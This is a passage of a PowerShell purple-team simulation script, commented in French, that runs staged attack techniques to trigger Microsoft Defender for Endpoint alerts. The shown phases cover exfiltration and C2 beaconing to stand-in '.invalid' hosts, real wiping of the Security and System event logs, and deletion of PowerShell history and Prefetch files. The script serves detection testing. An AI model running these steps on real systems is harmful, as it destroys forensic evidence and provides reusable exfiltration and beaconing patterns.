    ) -replace '[^a-zA-Z0-9]','').Substring(0,[Math]::Min(30,63))

    try {
        Resolve-DnsName "$encoded.exfil-sim.invalid" -ErrorAction SilentlyContinue | Out-Null
    } catch { }
    Write-Ok "Requête DNS exfil envoyée — télémétrie réseau générée"
    Write-Log "Phase8" "T1048 DNS Exfil" "Network telemetry expected"

    # T1041 — HTTPS Exfiltration (endpoint .invalid = connexion échoue)
    Write-Info "T1041 · Simulation exfiltration HTTPS"
    try {
        $body = [Convert]::ToBase64String(
            [IO.File]::ReadAllBytes("$SimRoot\exfil\data_package.zip")
        )
        Invoke-WebRequest -Uri "https://exfil-c2-simlab.invalid/upload" `
            -Method POST -Body $body -TimeoutSec 3 -ErrorAction SilentlyContinue | Out-Null
    } catch { }
    Write-Ok "Tentative upload HTTPS (échec prévu — telemetry réseau créée)"
    Write-Log "Phase8" "T1041 HTTPS Exfil" "Network telemetry expected"

    Write-Ok "PHASE 8 TERMINÉE"
    Wait-ForDefender -Seconds 15 -Reason "Corrélation archive + exfiltration réseau"
}

# ─── PHASE 9 : C2 Beaconing ──────────────────────────────────────────────────
function Invoke-Phase9 {
    Write-PhaseHeader 9 10 "C2 Beacon Simulation" "T1071.001 T1095 T1132"

    Write-Info "T1071.001 · Beaconing C2 périodique (3 cycles × 15s)"
    $c2Log = @()

    for ($i = 1; $i -le 3; $i++) {
        $ts       = Get-Date
        $beaconId = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("beacon_${i}_${env:COMPUTERNAME}"))

        # User-Agent réaliste (pattern Cobalt Strike default)
        try {
            Invoke-WebRequest `
                -Uri "https://c2-simlab-beacon.invalid/check-in?id=$beaconId&seq=$i" `
                -Headers @{'User-Agent'='Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)'} `
                -TimeoutSec 2 -ErrorAction SilentlyContinue | Out-Null
        } catch { }

        $c2Log += [PSCustomObject]@{
            Beacon    = $i
            Timestamp = $ts.ToString('HH:mm:ss')
            Endpoint  = "https://c2-simlab-beacon.invalid"
            Id        = $beaconId
        }

        Write-Ok "Beacon $i/3 — $($ts.ToString('HH:mm:ss'))"
        Write-Log "Phase9" "T1071.001 C2 Beacon $i" "Network telemetry expected"

        if ($i -lt 3) {
            Write-Host "  ⏳ Intervalle beacon 15s (périodicité simulée)..." -ForegroundColor DarkGray
            Start-Sleep -Seconds 15
        }
    }

    $c2Log | Export-Csv "$SimRoot\stage2\c2_beacon_log.csv" -NoTypeInformation
    Write-Ok "3 cycles complétés — pattern périodique dans télémétrie réseau"
    Wait-ForDefender -Seconds 10 -Reason "Corrélation pattern C2 beaconing"
}

# ─── PHASE 10 : Anti-Forensics & Cleanup ─────────────────────────────────────
#
#  DÉCLENCHEUR RÉEL MDE : "Windows Event Log was cleared"
#  Clé : wevtutil cl doit RÉUSSIR pour déclencher l'alerte.
#  Si MDE bloque la commande → surveiller quand même "Audit log cleared" dans
#  Advanced Hunting : SecurityEvent | where EventID == 1102
#
function Invoke-Phase10 {
    Write-PhaseHeader 10 10 "Anti-Forensics / Cleanup" "T1070.001 T1070.004 T1112"

    # T1070.001 — Event Log Clearing
    Write-Info "T1070.001 · Tentative d'effacement des journaux d'événements"
    Write-Info "  (Sur VM MDE bien configurée, cette commande génère EventID 1102)"

    $logsToWipe = @("Security","System","Application","Microsoft-Windows-PowerShell/Operational")
    foreach ($log in $logsToWipe) {
        try {
            wevtutil cl $log 2>$null
            Write-Warn "Journal '$log' effacé — alerte 'Windows Event Log cleared' attendue"
            Write-Log "Phase10" "T1070.001 EventLogClear $log" "Alert HIGH expected"
        } catch {
            Write-Block "Effacement '$log' bloqué ou refusé"
            Write-Log "Phase10" "T1070.001 EventLogClear $log" "BLOCKED"
        }
    }

    # Historique PowerShell
    Write-Info "Suppression historique PowerShell"
    try {
        $histPath = (Get-PSReadLineOption).HistorySavePath
        if (Test-Path $histPath) {
            Clear-Content $histPath -Force
            Write-Ok "Historique PowerShell effacé"
            Write-Log "Phase10" "PSHistory cleared" "OK"
        }
    } catch { }

    # T1070.004 — Suppression artefacts stage1
    Write-Info "T1070.004 · Suppression des artefacts stage1"
    Remove-Item "$SimRoot\stage1\*" -Force -Recurse -ErrorAction SilentlyContinue
    Write-Ok "Artefacts stage1 supprimés — File Deletion dans timeline"
    Write-Log "Phase10" "T1070.004 FileDeletion" "Timeline event"

    # T1112 — Nettoyage registre / cleanup
    Write-Info "T1112 · Nettoyage des artefacts de persistence"
    Unregister-ScheduledTask -TaskName "MicrosoftEdgeUpdateTaskMachineCore_SimLab" `
        -Confirm:$false -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
        -Name "MicrosoftSyncHelper" -ErrorAction SilentlyContinue
    Remove-Item -Path "HKCU:\Software\SimLab" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
    net user svc_backup_sim /delete 2>$null
    Write-Ok "Persistence nettoyée (télémétrie déjà dans Defender)"
    Write-Log "Phase10" "T1112 Cleanup" "OK — telemetry already ingested"

    # Prefetch / temp cleanup (anti-forensics supplémentaire)
    Write-Info "T1070 · Tentative nettoyage Prefetch"
    try {
        Remove-Item "C:\Windows\Prefetch\POWERSHELL*" -Force -ErrorAction SilentlyContinue
        Write-Ok "Prefetch PowerShell supprimé"
        Write-Log "Phase10" "T1070 PrefetchClean" "OK"
    } catch { }

    Write-Ok "PHASE 10 TERMINÉE"
    Wait-ForDefender -Seconds 25 -Reason "Dernière corrélation — anti-forensics clôture l'incident"
}

# ==============================================================================
#  RAPPORT FINAL
# ==============================================================================

function Write-FinalReport {
    $SimEnd    = Get-Date
    $Duration  = ($SimEnd - $SimStart).ToString("mm\:ss")

    Write-Host ""
    Write-Host "  ╔══════════════════════════════════════════════════════════╗" -ForegroundColor Green
    Write-Host "  ║            SIMULATION TERMINÉE — SIMLAB v2              ║" -ForegroundColor Green
    Write-Host "  ╚══════════════════════════════════════════════════════════╝" -ForegroundColor Green
    Write-Host ""
    Write-Host "  Durée      : $Duration" -ForegroundColor White
    Write-Host "  Début      : $($SimStart.ToString('HH:mm:ss'))" -ForegroundColor White
    Write-Host "  Fin        : $($SimEnd.ToString('HH:mm:ss'))" -ForegroundColor White
    Write-Host "  Log        : $LogFile" -ForegroundColor White
    Write-Host ""

    Write-Host "  ── Alertes réelles attendues dans MDE ──────────────────" -ForegroundColor Cyan
    Write-Host "  (Noms exacts tels qu'affichés dans le portail Defender)" -ForegroundColor DarkGray
    Write-Host ""

    $alerts = @(
        @{Phase="1"; Sev="MED"; Name="Suspicious process executed discovery activity";    Note="Burst ipconfig/net/nltest"}
        @{Phase="2"; Sev="MED"; Name="An encoded PowerShell command was run";             Note="Stager pattern dans payload décodé"}
        @{Phase="3"; Sev="HIG"; Name="Tampering with Windows Defender settings";          Note="Set-MpPreference bloqué par TamperProt"}
        @{Phase="4"; Sev="MED"; Name="Anomaly detected in ASEP registry";                 Note="HKCU Run key MicrosoftSyncHelper"}
        @{Phase="4"; Sev="MED"; Name="Suspicious scheduled task creation";                Note="MicrosoftEdgeUpdateTask masquée"}
        @{Phase="4"; Sev="HIG"; Name="User added to a local Administrators group";        Note="svc_backup_sim ajouté Administrators"}
        @{Phase="5"; Sev="HIG"; Name="UAC bypass was detected";                           Note="Fodhelper clé ms-settings (fonctionne)"}
        @{Phase="5"; Sev="CRI"; Name="Suspicious access to LSASS service";               Note="⚠ Nécessite Invoke-AtomicTest T1003.001"}
        @{Phase="6"; Sev="MED"; Name="Suspicious credential access activity";             Note="cmdkey + vaultcmd + cred_hunt"}
        @{Phase="8"; Sev="MED"; Name="Suspicious archive and data collection activity";   Note="Compress-Archive + collecte fichiers"}
        @{Phase="10"; Sev="HIG"; Name="Windows Event Log was cleared";                   Note="wevtutil cl Security/System"}
    )

    foreach ($a in $alerts) {
        $color = switch ($a.Sev) {
            "CRI" { "Red" }
            "HIG" { "Yellow" }
            "MED" { "White" }
            default { "Gray" }
        }
        Write-Host ("  [{0}][{1}] {2,-50}" -f $a.Sev, $a.Phase, $a.Name) -ForegroundColor $color
        Write-Host ("        ↳ {0}" -f $a.Note) -ForegroundColor DarkGray
    }

    Write-Host ""
    Write-Host "  ── Prochaines étapes ──────────────────────────────────" -ForegroundColor Cyan
    Write-Host "  1. security.microsoft.com → Incidents & Alerts" -ForegroundColor White
    Write-Host "  2. Chercher incident contenant 'hands-on keyboard' ou 'APT'" -ForegroundColor White
    Write-Host "  3. Onglet 'Une histoire d'attaque' → graphe d'incident" -ForegroundColor White
    Write-Host "  4. Device Timeline → filtrer depuis $($SimStart.ToString('HH:mm'))" -ForegroundColor White
    Write-Host "  5. Advanced Hunting → DeviceProcessEvents | DeviceNetworkEvents" -ForegroundColor White
    Write-Host ""
    Write-Host "  ── KQL de départ (Advanced Hunting) ──────────────────" -ForegroundColor Cyan
    Write-Host '  DeviceProcessEvents' -ForegroundColor DarkGray
    Write-Host '  | where DeviceName == $env:COMPUTERNAME' -ForegroundColor DarkGray
    Write-Host ("  | where Timestamp >= datetime({0})" -f $SimStart.ToString('yyyy-MM-ddTHH:mm:ss')) -ForegroundColor DarkGray
    Write-Host '  | where FileName in~ ("powershell.exe","cmd.exe","net.exe","nltest.exe")' -ForegroundColor DarkGray
    Write-Host '  | project Timestamp,FileName,ProcessCommandLine,InitiatingProcessFileName' -ForegroundColor DarkGray
    Write-Host '  | order by Timestamp asc' -ForegroundColor DarkGray
    Write-Host ""
    Write-Host "  Note : MDE peut prendre 5-15 min pour corréler en incident" -ForegroundColor DarkGray
    Write-Host ""

    "=== SIMLAB v2 COMPLETE ===" | Add-Content $LogFile
    "Start: $SimStart | End: $SimEnd | Duration: $Duration" | Add-Content $LogFile
    "Portal: security.microsoft.com" | Add-Content $LogFile
}

# ==============================================================================
#  POINT D'ENTRÉE
# ==============================================================================

Write-Banner
Test-Prerequisites
Initialize-Workspace

Write-Host ""
Write-Host "  Simulation démarrage dans 5s — Ctrl+C pour annuler" -ForegroundColor Yellow
Start-Sleep -Seconds 5

Invoke-Phase1
Invoke-Phase2
Invoke-Phase3
Invoke-Phase4
Invoke-Phase5
Invoke-Phase6
Invoke-Phase7
Invoke-Phase8
Invoke-Phase9
Invoke-Phase10

Write-FinalReport
